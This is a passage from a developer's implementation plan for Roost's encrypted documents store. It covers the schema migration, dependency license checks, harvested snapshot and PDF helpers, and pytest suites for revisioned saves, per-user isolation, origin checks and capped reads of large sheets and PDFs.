  roost/db/migrations.py roost/constants.py roost/talk/tool_catalog.py roost/talk/domain_tools.py
git -C /Users/blckit/Desktop/Code_Projects/roost commit -m "feat: notes role — the user's shared, encrypted notes with tags, [[links]] and search (schema v9)"
```

---

### Task 2: Migration v10 and the documents store and routes (harvest docs, sheets, PDF)

Implements **D2**'s storage and HTTP half: one encrypted blob per file with AAD `docs:payload` / `sheets:payload` / `pdf:payload`, PDFs as encrypted base64 bytes, the harvested Univer snapshot and PDF helpers, and gateway routes with revision compare-and-swap (409 on a stale revision). It also implements **D5** for documents (migration v10 tested from v8 with rows; per-user shared rows with taint provenance; Keep) and the `documents_changed` frame (**D4**).

Every read path is bounded by the work it does, not only by what it prints. The gateway runs with `mem_limit: 1g` (`docker-compose.yml`), and an OOM kill mid-write is exactly what the DB guards exist for; a recovered work item would also re-run the same read and crash again. Three rules follow:
- **Sheets.** The harvested `as_grid` builds the dense grid up to `used_bounds` before any cap (`lazyclaw/sheets/snapshot.py:308-323`), so one cell at `ZZZ9999999` would allocate rows × columns. `format_grid` therefore builds only the capped 30×10 window from `iter_cells`, and no render path calls `as_grid`.
- **The sheet's far corner.** No cell may sit past `ZZ100000` (`MAX_SHEET_ROW_INDEX`, `MAX_SHEET_COL_INDEX`): `CellEdit` checks it after `a1_to_rc`, and a Board save whose `cellData` keys go past it is 422.
- **PDFs.** The harvested `extract_text` reads every page before anything is cut. `pdf_text` opens pdfplumber, reads page by page, closes each page, and stops at `DOCUMENT_READ_MAX_CHARS` or `PDF_READ_MAX_PAGES`. `DocumentService.text` runs it under `asyncio.wait_for`.

**Files:**
- Create (harvest, Step 3): `roost/documents/doc_snapshot.py`, `roost/documents/markdown_blocks.py`, `roost/documents/sheet_snapshot.py`, `roost/documents/pdf_ops.py`, `roost/documents/sheet_text.py`
- Create: `roost/documents/__init__.py`, `roost/documents/models.py`, `roost/documents/cells.py`, `roost/documents/doc_markdown.py`, `roost/documents/store.py`, `roost/documents/render.py`, `roost/documents/format.py`, `roost/documents/service.py`, `roost/gateway/routes/documents.py`
- Create tests: `tests/test_document_formats.py`, `tests/test_document_store.py`, `tests/test_documents_api.py`
- Modify: `roost/db/migrations.py` (Migration 10), `roost/constants.py`, `roost/gateway/app.py`, `pyproject.toml`, `uv.lock`, `tests/test_migrations_v8.py` (append)

**Interfaces:**
- Consumes: Task 1's `RevisionConflict`, `seeded_v8` fixture helpers; `encrypt_field`, `decrypt_field`, `user_aad`, `get_user_dek`, `db_session`; `EventHub.publish`; `CurrentUser`, `RequireOrigin`.
- Produces:
  - Models: `DocumentKind`, `DocumentMeta`, `Document`, `DocumentDraft`, `DocumentChange`.
  - Cell types: `SheetCell`, `SheetRows`, `CellEdit`, `sheet_cells_in_bounds`.
  - Store: `DocumentStore(config)`, with `.create`, `.list(user_id, kind=None)`, `.get`, `.get_meta`, `.save(user_id, id, change)` (raises `RevisionConflict[Document]`), `.keep` and `.delete`.
  - Readers: `snapshot_of`, `pdf_bytes_of`, `pdf_text`, `document_text`.
  - Output shapes: `document_out`, `document_detail_out`, `document_line`, `document_list_text`, `KIND_LABEL`.
  - Service: `DocumentService(store, events)`, with `.list`, `.get`, `.get_meta`, `.create_doc`, `.create_sheet`, `.create_pdf`, `.make_pdf`, `.save`, `.append_markdown`, `.set_cells`, `.text`, `.keep` and `.delete`.
  - Converters: `doc_from_markdown`, `append_markdown`, `doc_to_markdown`, `doc_plain_text`, `format_grid`, `sheet_from_rows`.
  - PDF helpers: `pdf_ops.PdfError`, `is_pdf`, `page_count`, `extract_text`, `generate_from_text`.
  - `app.state.documents`.

- [ ] **Step 1: Path guard** (as Task 1 Step 1).

- [ ] **Step 2: Dependencies (permissive only, verified)**

In `pyproject.toml` `[project] dependencies`, append:

```toml
    # roost/documents/pdf_ops.py (harvested): page counts and PDF structure (BSD-3-Clause).
    "pypdf>=4.0.0",
    # roost/documents/pdf_ops.py (harvested): text out of a PDF (MIT).
    "pdfplumber>=0.11.0",
    # roost/documents/pdf_ops.py (harvested): a PDF made from a doc's text (BSD).
    "reportlab>=4.0.0",
```

```bash
cd /Users/blckit/Desktop/Code_Projects/roost && uv lock && uv sync
uv run python - <<'PY'
from importlib.metadata import metadata
for name in ("pypdf", "pdfplumber", "pdfminer.six", "pypdfium2", "reportlab", "pillow", "charset-normalizer"):
    meta = metadata(name)
    classifiers = [c for c in (meta.get_all("Classifier") or []) if c.startswith("License")]
    print(f"{name:20} {meta.get('License-Expression') or (meta.get('License') or '')[:60]!r} {classifiers}")
PY
```

Expected licenses:
- BSD: pypdf, reportlab
- MIT: pdfplumber, pdfminer.six, charset-normalizer
- Apache-2.0 / BSD-3-Clause: pypdfium2
- MIT-CMU: Pillow. This is the HPND-style, OSI-approved permissive license that reportlab already requires.

If any package shows GPL, AGPL, LGPL or no license, stop and report. Never add PyMuPDF.

- [ ] **Step 3: Harvest — verbatim copies with provenance headers, then commit them**

```bash
cd /Users/blckit/Desktop/Code_Projects/roost && mkdir -p roost/documents
LC=/Users/blckit/Desktop/Code_Projects/lazyclaw
hdr() { printf '# SPDX-License-Identifier: MIT\n# Harvested from LazyClaw %s @ 21e1002, adapted for Roost\n\n' "$1"; }
{ hdr "lazyclaw/docs/snapshot.py lines 1-245, 306-321, 405-716"; sed -n '1,245p;306,321p;405,716p' "$LC/lazyclaw/docs/snapshot.py"; } > roost/documents/doc_snapshot.py
{ hdr "lazyclaw/docs/markdown_blocks.py"; cat "$LC/lazyclaw/docs/markdown_blocks.py"; } > roost/documents/markdown_blocks.py
{ hdr "lazyclaw/sheets/snapshot.py lines 1-432"; sed -n '1,432p' "$LC/lazyclaw/sheets/snapshot.py"; } > roost/documents/sheet_snapshot.py
{ hdr "lazyclaw/pdf/ops.py lines 1-178, 582-620"; sed -n '1,178p;582,620p' "$LC/lazyclaw/pdf/ops.py"; } > roost/documents/pdf_ops.py
{ hdr "lazyclaw/skills/builtin/sheets.py lines 72-89"; sed -n '72,89p' "$LC/lazyclaw/skills/builtin/sheets.py"; } > roost/documents/sheet_text.py
uv run python -c "import roost.documents.doc_snapshot, roost.documents.markdown_blocks, roost.documents.sheet_snapshot, roost.documents.pdf_ops"
grep -n "lazyclaw" roost/documents/doc_snapshot.py roost/documents/markdown_blocks.py roost/documents/sheet_snapshot.py roost/documents/pdf_ops.py
git -C /Users/blckit/Desktop/Code_Projects/roost add roost/documents/doc_snapshot.py roost/documents/markdown_blocks.py \
  roost/documents/sheet_snapshot.py roost/documents/pdf_ops.py roost/documents/sheet_text.py
git -C /Users/blckit/Desktop/Code_Projects/roost commit -m "harvest: copy LazyClaw's doc, sheet and PDF snapshot helpers"
```

The `grep` must show `lazyclaw` only inside docstrings and comments (the four modules import only the standard library, plus pypdf, pdfplumber and reportlab lazily). If a code line imports `lazyclaw`, stop and report the line. If the `sed -n '1,432p'` copy of `sheets/snapshot.py` doesn't end just before the `hyperlink resource helpers` heading, adjust only the end line (431–433) so it does.

- [ ] **Step 4: Write the failing tests**

`tests/test_document_formats.py`:

```python
"""Docs, sheets and PDFs as data (M2 D2): the harvested Univer snapshot and PDF
helpers, plus Roost's markdown and table views of them."""

from __future__ import annotations

import time

import pytest
from pydantic import ValidationError

from roost.documents import pdf_ops, sheet_text
from roost.documents.cells import CellEdit, sheet_cells_in_bounds
from roost.documents.doc_markdown import append_markdown, doc_from_markdown, doc_plain_text, doc_to_markdown
from roost.documents.sheet_snapshot import as_grid, set_cells
from roost.documents.sheet_text import format_grid, sheet_from_rows

_TASKS_MD = "# My tasks\n\n- Call the dentist\n- **Buy** orchids\n1. first\nSee [the shop](https://example.com/shop)"


def test_markdown_survives_a_round_trip_through_a_univer_doc():
    snap = doc_from_markdown("My tasks", _TASKS_MD)
    assert snap["body"]["dataStream"].endswith("\r\n")
    out = doc_to_markdown(snap)
    for line in ("# My tasks", "- Call the dentist", "- **Buy** orchids", "1. first",
                 "[the shop](https://example.com/shop)"):
        assert line in out


def test_appending_markdown_keeps_what_was_there():
    snap = append_markdown(doc_from_markdown("List", "- eggs"), "- milk")
    assert doc_to_markdown(snap).splitlines() == ["- eggs", "- milk"]


def test_plain_text_drops_the_markdown_marks():
    assert doc_plain_text(doc_from_markdown("T", "# Title\n**bold** words")) == "Title\n\nbold words"


def test_a_sheet_from_rows_reads_back_as_a_small_table():
    snap = sheet_from_rows("October expenses", [["Date", "Category", "Amount"], ["2026-10-03", "food", "12.50"]])
    assert as_grid(snap) == [["Date", "Category", "Amount"], ["2026-10-03", "food", 12.5]]
    text = format_grid(snap)
    assert "A | B | C" in text and "12.5" in text and "food" in text


def test_a_big_sheet_is_shown_capped():
    snap = sheet_from_rows("Big", [[f"r{r}c{c}" for c in range(12)] for r in range(40)])
    text = format_grid(snap)
    assert "showing 30×10 of 40×12" in text and "r29c9" in text and "r30c0" not in text


def test_cells_are_set_by_a1_reference():
    snap = set_cells(sheet_from_rows("S", [["a", "1"]]), [{"cell": "B1", "value": "2"}, {"cell": "C1", "formula": "=A1"}])
    assert as_grid(snap) == [["a", 2, "=A1"]]


def test_a_far_off_cell_is_read_capped_without_the_dense_grid(monkeypatch):
    """One cell at ZZZ9999999 (an old edit, or an imported sheet's stray cell)
    must not make a read allocate rows x columns: only the 30x10 window is built."""
    def dense(*_args, **_kwargs):
        raise AssertionError("a read built the dense grid (as_grid)")

    monkeypatch.setattr(sheet_text.S, "as_grid", dense)
    snap = set_cells(sheet_from_rows("Far", [["a"]]), [{"row": 9_999_998, "col": 18_277, "value": "far"}])
    started = time.perf_counter()
    text = format_grid(snap)
    assert time.perf_counter() - started < 1.0
    assert "showing 30×10 of 9999999×18278" in text and "| a" in text and "far" not in text


def test_a_cell_past_the_sheets_corner_is_refused():
    assert CellEdit(cell="zz100000", value=1).cell == "zz100000"
    for far in ("ZZZ9999999", "AAA1", "A100001"):
        with pytest.raises(ValidationError):
            CellEdit(cell=far, value=1)
    assert sheet_cells_in_bounds(sheet_from_rows("S", [["a"]]))
    assert not sheet_cells_in_bounds(set_cells(sheet_from_rows("S", [["a"]]), [{"row": 100_000, "col": 0, "value": 1}]))
    assert not sheet_cells_in_bounds(set_cells(sheet_from_rows("S", [["a"]]), [{"row": 0, "col": 702, "value": 1}]))


def test_a_pdf_made_from_text_reads_back():
    data = pdf_ops.generate_from_text("Ana likes orchids.\n\nBirthday 3 May.", title="Ana")
    assert pdf_ops.is_pdf(data) and pdf_ops.page_count(data) == 1
    assert "orchids" in pdf_ops.extract_text(data)


def test_something_that_is_not_a_pdf_is_refused():
    assert not pdf_ops.is_pdf(b"hello")
    with pytest.raises(pdf_ops.PdfError):
        pdf_ops.page_count(b"hello")
```

`tests/test_document_store.py`:

```python
"""DocumentStore (M2 D2, D5): one encrypted blob per file under its kind's AAD,
revisioned, shared by every bot, scoped to the user."""

from __future__ import annotations

import base64
import json
import sqlite3

import pytest
from cryptography.exceptions import InvalidTag

from roost.bots.store import BotStore
from roost.config import load_config
from roost.crypto.encryption import decrypt, user_aad
from roost.crypto.key_manager import get_user_dek
from roost.db.connection import get_db_path, init_db
from roost.documents.doc_markdown import doc_from_markdown
from roost.documents.models import DocumentChange, DocumentDraft
from roost.documents.render import snapshot_of
from roost.documents.store import DocumentStore
from roost.gateway.auth import register_user
from roost.records.revision import RevisionConflict
from team_helpers import make_bot

# Spec §4.7 / LazyClaw's contexts — written out here, not imported, on purpose.
_PAYLOAD_AAD = {"doc": "docs:payload", "sheet": "sheets:payload", "pdf": "pdf:payload"}


@pytest.fixture
async def cfg():
    config = load_config()
    await init_db(config)
    return config


@pytest.fixture
async def user_id(cfg):
    return (await register_user(cfg, "alice", "pw-123456")).id


def _doc(title: str = "My tasks", markdown: str = "- eggs") -> DocumentDraft:
    return DocumentDraft(kind="doc", title=title, body=json.dumps(doc_from_markdown(title, markdown)))


def _sheet(title: str = "Sheet") -> DocumentDraft:
    return DocumentDraft(kind="sheet", title=title, body=json.dumps({"sheets": {}}))


def _raw(cfg, document_id: str) -> tuple[str, str]:
    con = sqlite3.connect(get_db_path(cfg))
    try:
        return con.execute("SELECT title, payload FROM documents WHERE id = ?", (document_id,)).fetchone()
    finally:
        con.close()


async def test_each_kind_is_encrypted_under_its_own_aad(cfg, user_id):
    store = DocumentStore(cfg)
    dek = await get_user_dek(cfg, user_id)
    pdf = DocumentDraft(kind="pdf", title="Lease", body=base64.b64encode(b"%PDF-1.4 x").decode("ascii"), pages=1)
    for draft in (_doc(), _sheet(), pdf):
        meta = await store.create(user_id, draft, created_by_bot=None, tainted=False)
        title, payload = _raw(cfg, meta.id)
        assert title.startswith("enc:v2:") and payload.startswith("enc:v2:") and draft.title not in title
        assert decrypt(payload, dek, user_aad(user_id, _PAYLOAD_AAD[draft.kind])) == draft.body
        with pytest.raises(InvalidTag):
            decrypt(payload, dek, user_aad(user_id, "documents:title"))
        assert (await store.get(user_id, meta.id)).body == draft.body


async def test_a_save_bumps_the_revision_and_a_stale_one_is_refused_with_the_current_copy(cfg, user_id):
    store = DocumentStore(cfg)
    meta = await store.create(user_id, _doc(), created_by_bot=None, tainted=False)
    saved = await store.save(user_id, meta.id, DocumentChange(base_revision=1, title="Renamed"))
    assert (saved.title, saved.revision) == ("Renamed", 2)
    with pytest.raises(RevisionConflict) as caught:
        await store.save(user_id, meta.id, DocumentChange(base_revision=1, title="Stale"))
    assert (caught.value.current.meta.title, caught.value.current.meta.revision) == ("Renamed", 2)
    assert (await store.get_meta(user_id, meta.id)).title == "Renamed"


async def test_a_save_with_nothing_to_change_is_refused(cfg, user_id):
    meta = await DocumentStore(cfg).create(user_id, _doc(), created_by_bot=None, tainted=False)
    with pytest.raises(ValueError):
        await DocumentStore(cfg).save(user_id, meta.id, DocumentChange(base_revision=1))


async def test_list_is_newest_first_and_filters_by_kind(cfg, user_id):
    store = DocumentStore(cfg)
    await store.create(user_id, _doc("First"), created_by_bot=None, tainted=False)
    await store.create(user_id, _sheet("Second"), created_by_bot=None, tainted=False)
    assert [meta.title for meta in await store.list(user_id)] == ["Second", "First"]
    assert [meta.title for meta in await store.list(user_id, kind="doc")] == ["First"]


async def test_another_user_sees_and_changes_nothing(cfg, user_id):
    bob = (await register_user(cfg, "bob", "pw-123456")).id
    store = DocumentStore(cfg)
    meta = await store.create(user_id, _doc(), created_by_bot=None, tainted=False)
    assert await store.get(bob, meta.id) is None and await store.get_meta(bob, meta.id) is None
    assert await store.list(bob) == ()
    assert await store.save(bob, meta.id, DocumentChange(base_revision=1, title="x")) is None
    assert await store.keep(bob, meta.id) is None
    assert await store.delete(bob, meta.id) is False


async def test_keep_clears_the_taint_and_delete_is_soft(cfg, user_id):
    store = DocumentStore(cfg)
    meta = await store.create(user_id, _doc(), created_by_bot=None, tainted=True)
    kept = await store.keep(user_id, meta.id)
    assert (kept.tainted, kept.revision) == (False, 1)
    assert await store.delete(user_id, meta.id) is True
    assert await store.get(user_id, meta.id) is None
    assert await store.delete(user_id, meta.id) is False


async def test_retiring_the_bot_keeps_the_users_documents(cfg, user_id):
    bot = await make_bot(cfg, user_id, "Office", roles=("docs",))
    meta = await DocumentStore(cfg).create(user_id, _doc(), created_by_bot=bot.id, tainted=False)
    await BotStore(cfg).delete(user_id, bot.id)
    [kept] = await DocumentStore(cfg).list(user_id)
    assert (kept.id, kept.created_by_bot) == (meta.id, None)


async def test_a_damaged_blob_reads_as_a_plain_error(cfg, user_id):
    store = DocumentStore(cfg)
    meta = await store.create(user_id, _doc(), created_by_bot=None, tainted=False)
    con = sqlite3.connect(get_db_path(cfg))
    try:
        con.execute("UPDATE documents SET payload = 'enc:v2:AAAA:BBBB' WHERE id = ?", (meta.id,))
        con.commit()
    finally:
        con.close()
    with pytest.raises(ValueError, match="could not be read"):
        snapshot_of(await store.get(user_id, meta.id))
```

`tests/test_documents_api.py`:

```python
"""Documents over HTTP (the Board's Documents tab, M2 D2/D4) and documents_changed."""

from __future__ import annotations

import io
import sqlite3

import httpx
import pdfplumber.page
from fastapi.testclient import TestClient
from pypdf import PdfWriter

import roost.gateway.routes.documents as documents_routes
from roost.config import load_config
from roost.db.connection import get_db_path, init_db
from roost.documents import pdf_ops
from roost.gateway.app import create_app
from roost.gateway.auth import register_user

O = {"Origin": "http://127.0.0.1:18800"}
PDF = {**O, "Content-Type": "application/pdf"}


def _client() -> TestClient:
    c = TestClient(create_app())
    assert c.post("/api/auth/register", json={"username": "alice", "password": "pw-123456"}, headers=O).status_code == 201
    return c


def _frames() -> list[str]:
    con = sqlite3.connect(get_db_path(load_config()))
    try:
        return [row[0] for row in con.execute("SELECT kind FROM events ORDER BY seq")]
    finally:
        con.close()


def _new_doc(c: TestClient, title: str = "My tasks", markdown: str = "# My tasks\n\n- Call the dentist") -> dict:
    created = c.post("/api/documents", json={"kind": "doc", "title": title, "markdown": markdown}, headers=O)
    assert created.status_code == 201
    return created.json()


def test_a_doc_from_markdown_reads_back_saves_and_deletes():
    c = _client()
    doc = _new_doc(c)
    assert (doc["kind"], doc["title"], doc["revision"], doc["tainted"], doc["pages"]) == ("doc", "My tasks", 1, False, None)
    assert "- Call the dentist" in c.get(f"/api/documents/{doc['id']}/text").json()["text"]
    detail = c.get(f"/api/documents/{doc['id']}").json()
    assert detail["payload"]["body"]["dataStream"].startswith("My tasks")
    body = {"dataStream": "Edited\r\n", "paragraphs": [{"startIndex": 6}], "textRuns": [],
            "sectionBreaks": [{"startIndex": 7}]}
    saved = c.put(f"/api/documents/{doc['id']}", json={"base_revision": 1, "payload": {**detail["payload"], "body": body}},
                  headers=O)
    assert saved.status_code == 200 and saved.json()["revision"] == 2
    assert c.get(f"/api/documents/{doc['id']}/text").json()["text"] == "Edited"
    assert c.delete(f"/api/documents/{doc['id']}", headers=O).status_code == 204
    assert c.get(f"/api/documents/{doc['id']}").status_code == 404


def test_a_sheet_from_rows_lists_with_its_kind():
    c = _client()
    sheet = c.post("/api/documents", json={"kind": "sheet", "title": "October expenses",
                                           "rows": [["Date", "Amount"], ["2026-10-03", 12.5]]}, headers=O).json()
    assert [d["title"] for d in c.get("/api/documents", params={"kind": "sheet"}).json()] == ["October expenses"]
    assert c.get("/api/documents", params={"kind": "doc"}).json() == []
    assert "12.5" in c.get(f"/api/documents/{sheet['id']}/text").json()["text"]


def test_a_stale_document_save_is_409_with_the_current_copy():
    c = _client()
    doc = _new_doc(c)
    assert c.put(f"/api/documents/{doc['id']}", json={"base_revision": 1, "title": "Second"}, headers=O).status_code == 200
    stale = c.put(f"/api/documents/{doc['id']}", json={"base_revision": 1, "title": "Third"}, headers=O)
    assert stale.status_code == 409
    current = stale.json()["current"]
    assert (current["title"], current["revision"]) == ("Second", 2) and "dataStream" in current["payload"]["body"]


def test_saving_a_payload_of_the_wrong_kind_is_422():
    c = _client()
    doc = _new_doc(c)
    sheet = c.post("/api/documents", json={"kind": "sheet", "title": "S"}, headers=O).json()
    assert c.put(f"/api/documents/{doc['id']}", json={"base_revision": 1, "payload": {"sheets": {}}}, headers=O).status_code == 422
    assert c.put(f"/api/documents/{sheet['id']}", json={"base_revision": 1, "payload": {"body": {}}}, headers=O).status_code == 422
    assert c.put(f"/api/documents/{doc['id']}", json={"base_revision": 1}, headers=O).status_code == 422


def test_a_pdf_upload_is_marked_from_web_content_and_reads_back():
    c = _client()
    data = pdf_ops.generate_from_text("The deposit is two months' rent.", title="Lease")
    up = c.post("/api/documents/pdf", params={"title": "Lease"}, content=data, headers=PDF)
    assert up.status_code == 201
    pdf = up.json()
    assert (pdf["kind"], pdf["pages"], pdf["tainted"]) == ("pdf", 1, True)
    raw = c.get(f"/api/documents/{pdf['id']}/pdf")
    assert raw.headers["content-type"] == "application/pdf" and raw.content == data
    assert "two months" in c.get(f"/api/documents/{pdf['id']}/text").json()["text"]
    assert c.get(f"/api/documents/{pdf['id']}").json()["payload"] is None
    assert c.put(f"/api/documents/{pdf['id']}", json={"base_revision": 1, "payload": {"body": {}}}, headers=O).status_code == 422
    assert c.post(f"/api/documents/{pdf['id']}/keep", headers=O).json()["tainted"] is False


def test_pdf_upload_limits(monkeypatch):
    c = _client()
    data = pdf_ops.generate_from_text("x")
    text = {**O, "Content-Type": "text/plain"}
    assert c.post("/api/documents/pdf", params={"title": "x"}, content=data, headers=text).status_code == 415
    assert c.post("/api/documents/pdf", params={"title": "x"}, content=b"hello", headers=PDF).status_code == 422
    monkeypatch.setattr(documents_routes, "MAX_PDF_BYTES", 100)
    assert c.post("/api/documents/pdf", params={"title": "x"}, content=data, headers=PDF).status_code == 413
    assert c.get("/api/documents").json() == []


def test_a_long_pdf_is_read_only_until_the_cap(monkeypatch):
    """A 200-page upload: /text reads the first pages, page by page, and stops at
    the cap. It never extracts all 200 pages (the gateway has mem_limit 1g)."""
    one = pdf_ops.generate_from_text("Clause. " * 300, title="Lease")   # about 2,400 characters
    writer = PdfWriter()
    for _ in range(200):
        writer.append(io.BytesIO(one), pages=(0, 1))
    buffer = io.BytesIO()
    writer.write(buffer)
    read: list[int] = []
    extract = pdfplumber.page.Page.extract_text

    def counted(page, *args, **kwargs):
        read.append(page.page_number)
        return extract(page, *args, **kwargs)

    monkeypatch.setattr(pdfplumber.page.Page, "extract_text", counted)
    c = _client()
    pdf = c.post("/api/documents/pdf", params={"title": "Lease"}, content=buffer.getvalue(), headers=PDF).json()
    assert pdf["pages"] == 200
    text = c.get(f"/api/documents/{pdf['id']}/text").json()["text"]
    assert 1 < len(read) <= 3 and read == sorted(read)
    assert text.startswith("Lease") and text.endswith("…(showing the start of a 200-page PDF)")


def test_a_sheet_payload_with_a_far_off_cell_is_422():
    c = _client()
    sheet = c.post("/api/documents", json={"kind": "sheet", "title": "S", "rows": [["a"]]}, headers=O).json()
    payload = c.get(f"/api/documents/{sheet['id']}").json()["payload"]
    [sheet_id] = payload["sheets"]
    far = {**payload, "sheets": {sheet_id: {**payload["sheets"][sheet_id], "cellData": {"9999998": {"0": {"v": 1}}}}}}
    saved = c.put(f"/api/documents/{sheet['id']}", json={"base_revision": 1, "payload": far}, headers=O)
    assert saved.status_code == 422 and "ZZ100000" in saved.json()["detail"]
    assert c.get(f"/api/documents/{sheet['id']}").json()["revision"] == 1


def test_a_damaged_blob_is_a_plain_422():
    c = _client()
    doc = _new_doc(c)
    assert c.get(f"/api/documents/{doc['id']}/pdf").status_code == 404
    con = sqlite3.connect(get_db_path(load_config()))
    try:
        con.execute("UPDATE documents SET payload = 'enc:v2:AAAA:BBBB'")
        con.commit()
    finally:
        con.close()
    broken = c.get(f"/api/documents/{doc['id']}")
    assert broken.status_code == 422 and "could not be read" in broken.json()["detail"]
    assert c.get(f"/api/documents/{doc['id']}/text").status_code == 422


def test_every_change_publishes_documents_changed():
    c = _client()
    doc = _new_doc(c)
    c.put(f"/api/documents/{doc['id']}", json={"base_revision": 1, "title": "B"}, headers=O)
    c.delete(f"/api/documents/{doc['id']}", headers=O)
    assert _frames().count("documents_changed") == 3


def test_mutations_need_the_origin_and_a_login():
    c = _client()
    evil = {"Origin": "http://evil.example"}
    assert c.post("/api/documents", json={"kind": "doc", "title": "x"}, headers=evil).status_code == 403
    assert TestClient(create_app()).get("/api/documents").status_code == 401


async def test_another_users_document_is_404():
    app = create_app()
    cfg = load_config()
    await init_db(cfg)
    for name in ("alice", "bob"):
        await register_user(cfg, name, "pw-123456")
    transport = httpx.ASGITransport(app=app)
    async with httpx.AsyncClient(transport=transport, base_url="http://roost.test") as alice, \
            httpx.AsyncClient(transport=transport, base_url="http://roost.test") as bob:
        for client, name in ((alice, "alice"), (bob, "bob")):
            await client.post("/api/auth/login", json={"username": name, "password": "pw-123456"}, headers=O)
        doc = (await alice.post("/api/documents", json={"kind": "doc", "title": "mine"}, headers=O)).json()
        for path in (f"/api/documents/{doc['id']}", f"/api/documents/{doc['id']}/text"):
            assert (await bob.get(path)).status_code == 404
        assert (await bob.put(f"/api/documents/{doc['id']}", json={"base_revision": 1, "title": "x"}, headers=O)).status_code == 404
        assert (await bob.delete(f"/api/documents/{doc['id']}", headers=O)).status_code == 404
        assert (await bob.get("/api/documents")).json() == []
```

Append to `tests/test_migrations_v8.py`:

```python
async def test_v10_adds_an_empty_documents_table_that_only_takes_known_kinds(seeded_v8):
    cfg, db_path = seeded_v8
    await init_db(cfg)
    assert _query(db_path, "SELECT COUNT(*) FROM documents") == [(0,)]
    assert {"user_id", "kind", "title", "payload", "pages", "tags", "revision", "created_at", "updated_at",
            "deleted_at", "created_by_bot", "tainted"} <= set(_columns(db_path, "documents"))
    con = sqlite3.connect(db_path)
    try:
        with pytest.raises(sqlite3.IntegrityError):
            con.execute("INSERT INTO documents (id, user_id, kind, title, payload, created_at, updated_at) "
                        f"VALUES ('d1','u1','xlsx','enc:t','enc:p','{_NOW}','{_NOW}')")
    finally:
        con.close()
    assert _counts(db_path) == _EXPECTED
```

- [ ] **Step 5: Run them to see them fail**

Run: `cd /Users/blckit/Desktop/Code_Projects/roost && uv run pytest tests/test_document_formats.py tests/test_document_store.py tests/test_documents_api.py tests/test_migrations_v8.py -q`
Expected: FAIL. You should see `ModuleNotFoundError: roost.documents.doc_markdown` (and `.models`, `.store`, `.cells`), an `ImportError` for `sheet_from_rows` from the bare harvested `sheet_text.py`, 404s on `/api/documents`, and `no such table: documents`. (The far-off-cell test can't run against the bare harvested `_format_grid`: the module fails to import first, so no dense grid is ever built in this step.)

- [ ] **Step 6: Constants and Migration 10**

Append to `roost/constants.py`:

```python
# ---------------------------------------------------------------------------
# Documents (roost/documents/*) — M2 D2
# ---------------------------------------------------------------------------

MAX_DOCUMENT_TITLE_LENGTH = 120          # LazyClaw's docs / sheets _NAME_MAX
MAX_DOC_MARKDOWN_LENGTH = 100_000
MAX_SHEET_ROWS_PER_CALL = 500
MAX_SHEET_COLS = 26
MAX_SHEET_CELL_TEXT = 1000
MAX_SHEET_CELLS_PER_CALL = 500
MAX_PDF_BYTES = 20 * 1024 * 1024
# A doc or sheet snapshot saved from the Board, in JSON characters.
MAX_DOCUMENT_PAYLOAD_CHARS = 8_000_000
# The store's last guard on any stored body (a 20 MB PDF is ~27M base64 characters).
MAX_DOCUMENT_BODY_CHARS = 30_000_000
# What read_document and GET /api/documents/{id}/text show (LazyClaw's preview caps).
DOCUMENT_READ_MAX_CHARS = 4000
SHEET_READ_MAX_ROWS = 30
SHEET_READ_MAX_COLS = 10
DOCUMENT_LIST_LIMIT = 50
# A sheet's far corner as 0-based indexes: 100,000 rows and columns A to ZZ
# (ZZ100000). A cell past it is refused, from a tool's A1 edit or a Board save,
# so no read is ever asked to cover millions of rows.
MAX_SHEET_ROW_INDEX = 99_999
MAX_SHEET_COL_INDEX = 701
# A PDF's text is read page by page and stops after this many pages, or sooner
# at DOCUMENT_READ_MAX_CHARS.
PDF_READ_MAX_PAGES = 50
# How long read_document or /text waits for a document's text before refusing plainly.
DOCUMENT_READ_TIMEOUT_SECONDS = 20
```

In `roost/db/migrations.py`, add before `MIGRATIONS` and append the entry:

```python
# One encrypted blob per file (spec §4.7; LazyClaw's docs / sheets / pdf_files,
# whose `name` is `title` here): payload is the Univer snapshot JSON or the PDF's
# base64 bytes, enc:v2 under docs:payload / sheets:payload / pdf:payload; title
# and tags are enc:v2 (tags: reserved for M4's import of LazyClaw's document
# tags); revision is the compare-and-swap counter every save bumps.
_DOCUMENTS = """
CREATE TABLE IF NOT EXISTS documents (
    id TEXT PRIMARY KEY,
    user_id TEXT NOT NULL REFERENCES users(id) ON DELETE CASCADE,
    kind TEXT NOT NULL CHECK (kind IN ('doc','sheet','pdf')),
    title TEXT NOT NULL,
    payload TEXT NOT NULL,
    pages INTEGER,
    tags TEXT,
    revision INTEGER NOT NULL DEFAULT 1,
    created_at TEXT NOT NULL,
    updated_at TEXT NOT NULL,
    deleted_at TEXT,
    created_by_bot TEXT REFERENCES bots(id) ON DELETE SET NULL,
    tainted INTEGER NOT NULL DEFAULT 0
)"""
```

```python
    Migration(10, "documents", (
        _DOCUMENTS,
        "CREATE INDEX IF NOT EXISTS idx_documents_user ON documents(user_id, kind, updated_at)",
    )),
```

- [ ] **Step 7: Adapt the harvested files** (each keeps its two header lines)

- `doc_snapshot.py`, `markdown_blocks.py`, `sheet_snapshot.py`, `pdf_ops.py`: keep every function body verbatim. Rewrite each module docstring's references to LazyClaw modules (`lazyclaw.skills.builtin.*`, `lazyclaw.docs.docx_io`, `lazyclaw.sheets.xlsx_io`) in our words: "Roost's documents tools and routes use these". In `doc_snapshot.py`, add one sentence to the docstring saying the file holds the factory, the paragraph readers and the block builders/readers of LazyClaw's snapshot module, not its run-level or hyperlink-only helpers.
- `sheet_text.py` becomes:

```python
# SPDX-License-Identifier: MIT
# Harvested from LazyClaw lazyclaw/skills/builtin/sheets.py lines 72-89 @ 21e1002, adapted for Roost

"""A sheet as text for the model (the harvested ``_format_grid``, with Roost's
caps and a bounded window) and a new sheet from plain rows (Roost)."""

from __future__ import annotations

from typing import Any, Sequence

from roost.constants import SHEET_READ_MAX_COLS, SHEET_READ_MAX_ROWS
from roost.documents import sheet_snapshot as S


def format_grid(snap: dict[str, Any], sheet: int | str = 0) -> str:
    """Render a worksheet's value grid as a labelled text table for the LLM.

    Roost: only the capped window is built, from ``iter_cells``. The harvested
    ``as_grid`` builds the whole dense grid up to ``used_bounds`` first, so one
    far-off cell would allocate millions of rows; no read path calls it.
    ``used_bounds`` gives only the size for the "showing X of Y" note."""
    max_r, max_c = S.used_bounds(snap, sheet)
    if max_r < 0:
        return "(empty sheet)"
    n_rows, n_cols = min(max_r + 1, SHEET_READ_MAX_ROWS), min(max_c + 1, SHEET_READ_MAX_COLS)
    shown = {(r, c): S.cell_display(cell) for r, c, cell in S.iter_cells(snap, sheet)
             if r < n_rows and c < n_cols and S.has_content(cell)}
